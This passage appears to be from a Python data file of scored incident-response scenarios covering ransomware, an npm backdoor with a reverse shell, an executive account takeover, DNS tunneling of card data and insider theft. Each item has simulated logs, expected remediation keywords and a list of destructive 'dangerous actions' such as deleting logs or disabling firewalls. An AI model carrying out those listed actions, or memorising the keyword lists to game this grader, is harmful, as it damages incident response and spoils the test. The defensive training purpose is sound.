        "network_indicators": "Internal SMB spread + C2 to 185.220.101.42:443 | 3 file servers + backup server at risk",
        "affected_systems": "SRV-FILE-01,02,03 (encrypted), SRV-FILE-04,05 (spreading), SRV-BKP-01 (backup, targeted), AD credentials compromised",
        "timeline": "03:00 UTC detection, estimated 01:00 UTC initial compromise (2-hour dwell time)",
        "risk": "Active ransomware with lateral spread targeting backup infrastructure — risk of total data loss",
        "remediation_keywords": ["isolate", "network", "segment", "disconnect", "backup", "preserve", "credential", "rotate", "password", "reset", "forensic", "image", "contain", "eradicate", "recover", "restore", "patch", "monitor"],
        "required_sections": ["containment", "eradication", "recovery"],
        "dangerous_actions": ["pay ransom", "delete logs", "format", "wipe", "disable firewall", "disable antivirus", "turn off monitoring", "ignore"],
        "min_keywords": 5,
    },
    {
        "alert_summary": "Supply chain compromise via npm package affecting 23 production microservices. Backdoor establishes reverse shell. Detected 4 hours after deployment.",
        "log_excerpt": "Apr 07 13:00:00 ci-scan [CRITICAL] Backdoor in npm 'util-helpers' v2.1.0\nApr 07 13:00:01 fw-01 [INFO] 23 services calling 45.77.xx.xx:4444 (reverse shell)\nApr 07 13:00:02 ci-scan [INFO] Compromised maintainer account used to publish\nApr 07 13:00:03 asset-mgr [INFO] Affected: payment-svc, auth-svc, user-svc + 20 others",
        "network_indicators": "23 production pods → 45.77.xx.xx:4444 | Reverse shell | npm registry compromise",
        "affected_systems": "23 microservices including payment-svc and auth-svc, CI/CD pipeline, npm dependency chain",
        "timeline": "09:00 UTC malicious package published, 09:15 CI/CD auto-deployed, 13:00 detected — 4-hour exposure",
        "risk": "Supply chain backdoor in production with access to payment and auth services — potential customer data breach",
        "remediation_keywords": ["rollback", "deploy", "previous", "version", "block", "firewall", "rule", "IP", "rotate", "credential", "key", "secret", "audit", "access", "log", "scan", "dependency", "pin", "lock", "verify", "integrity", "notify", "communication"],
        "required_sections": ["containment", "eradication", "recovery"],
        "dangerous_actions": ["ignore", "delete logs", "disable monitoring", "keep running", "restart services without rollback"],
        "min_keywords": 6,
    },
    {
        "alert_summary": "CTO account compromised — impossible travel detected. Attacker accessed executive file shares and modified board meeting documents from Russian IP.",
        "log_excerpt": "Apr 07 10:15:00 vpn [INFO] Login: cto@company.com from NYC (74.125.xx.xx)\nApr 07 10:28:00 o365 [ALERT] Login: cto@company.com from Moscow (5.45.xx.xx)\nApr 07 10:29:00 sharepoint [INFO] Modified: board_financials_Q1.xlsx, ma_targets.pdf\nApr 07 10:30:00 o365 [INFO] Mail forwarding rule added: all mail → external@protonmail.com",
        "network_indicators": "Dual sessions: NYC VPN + Moscow direct | SharePoint + Exchange access | ProtonMail forwarding",
        "affected_systems": "CTO account, executive SharePoint, Exchange mail, VPN, board financial documents",
        "timeline": "10:15 UTC legit NYC login, 10:28 Moscow login, 10:29-10:30 document access + mail rule",
        "risk": "Executive account takeover with access to board financials and M&A targets — corporate espionage risk",
        "remediation_keywords": ["disable", "account", "session", "revoke", "terminate", "MFA", "reset", "password", "remove", "forwarding", "rule", "audit", "access", "review", "document", "restore", "version", "notify", "executive", "legal", "preserve", "evidence"],
        "required_sections": ["containment", "eradication", "recovery"],
        "dangerous_actions": ["delete account", "ignore", "disable logging", "notify attacker", "wipe device"],
        "min_keywords": 5,
    },
    {
        "alert_summary": "DNS tunneling detected from payment processing server. Base64-encoded data being exfiltrated to domain registered 18 hours ago. 340+ queries with encoded subdomains.",
        "log_excerpt": "Apr 07 04:20:00 dns [ALERT] 340 queries: *.data.freshdom-xyz.com from SRV-PAY-01\nApr 07 04:20:01 dns [INFO] Subdomains: base64-encoded 255-byte chunks (credit card patterns)\nApr 07 04:20:02 fw-01 [INFO] SRV-PAY-01 handles 2,000 transactions/hour\nApr 07 04:20:03 whois [INFO] freshdom-xyz.com registered 18 hours ago, Namecheap, privacy guard",
        "network_indicators": "SRV-PAY-01 → DNS: freshdom-xyz.com | 340 encoded queries | Domain age: 18 hours | Payment data patterns",
        "affected_systems": "SRV-PAY-01 (payment processing, PCI-DSS scope), DNS infrastructure, customer payment card data",
        "timeline": "04:20 UTC detection, estimated 03:50 UTC start — 30-minute active exfiltration, 2,000 transactions/hour processed",
        "risk": "Active exfiltration of payment card data via DNS tunneling — PCI-DSS breach notification required within 72 hours",
        "remediation_keywords": ["block", "DNS", "domain", "sinkhole", "isolate", "server", "network", "segment", "forensic", "capture", "preserve", "PCI", "notification", "card", "bank", "acquirer", "rotate", "key", "encryption", "scan", "IOC", "indicator", "monitor"],
        "required_sections": ["containment", "eradication", "recovery"],
        "dangerous_actions": ["restart server", "delete logs", "ignore", "disable DNS monitoring", "wipe server", "continue processing"],
        "min_keywords": 6,
    },
    {
        "alert_summary": "Insider threat: departing DBA exfiltrating full customer database (2.1GB with SSNs) to personal USB. Resignation submitted 3 days ago.",
        "log_excerpt": "Apr 07 17:45:00 dlp [CRITICAL] USB write: customer_full_export.csv (2.1GB) by db-admin.rao\nApr 07 17:45:01 dlp [INFO] Contents: names, emails, SSNs, credit card hashes (340K records)\nApr 07 17:45:02 dlp [INFO] Device: personal SanDisk Ultra 64GB\nApr 07 17:45:03 hr [INFO] db-admin.rao: resignation effective Apr 14, currently serving notice",
        "network_indicators": "USB transfer only — no network exfiltration detected | DLP triggered on PII patterns",
        "affected_systems": "Customer database (340K records with SSNs), db-admin.rao workstation and credentials, USB device",
        "timeline": "17:45 UTC USB write detected, resignation on Apr 4, last day Apr 14",
        "risk": "Insider data theft of 340K customer records with SSNs — regulatory notification required, potential identity theft exposure",
        "remediation_keywords": ["disable", "access", "account", "revoke", "confiscate", "USB", "device", "legal", "HR", "preserve", "evidence", "forensic", "image", "workstation", "audit", "query", "history", "notification", "breach", "regulatory", "customer", "credit", "monitoring"],
        "required_sections": ["containment", "eradication", "recovery"],
        "dangerous_actions": ["delete data", "confront employee alone", "ignore", "wipe workstation", "let them keep working", "skip regulatory notification"],
        "min_keywords": 6,
    },
]
